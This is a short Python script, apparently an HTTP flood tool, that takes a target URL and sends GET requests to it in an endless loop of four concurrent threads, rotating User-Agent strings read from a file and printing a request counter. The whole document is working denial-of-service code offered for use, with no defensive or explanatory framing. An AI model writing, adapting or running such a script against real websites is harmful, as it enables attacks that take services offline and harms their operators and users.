from requests import get
from threading import Thread
from random import randint
import sys
cc = 0
fs = open("about.tail")
print(fs.read())
fs.close()
urls = input("Enter url: ")
def start_d(url):
	f = open("user_a.txt")
	agent = f.read().split("\n")
	min = 0
	max = len(agent) - 1
	to_use = randint(min, max)
	f.close()
	try:
	 get(url, headers={"User-Agent":agent[to_use]})
	except:
	 print(sys.exc_info()[1])
while True:
	a = 0
	cc += 1
	st = Thread(target=start_d, args=(urls,))
	st2 = Thread(target=start_d, args=(urls,))
	st3 = Thread(target=start_d, args=(urls,))
	st4 = Thread(target=start_d, args=(urls,))
	st.start()
	st2.start()
	st3.start()
	st4.start()
	st2.join()
	st3.join()
	st4.join()
	st.join()
	a += 1
	print("Request number - "+str(cc)+" sended")
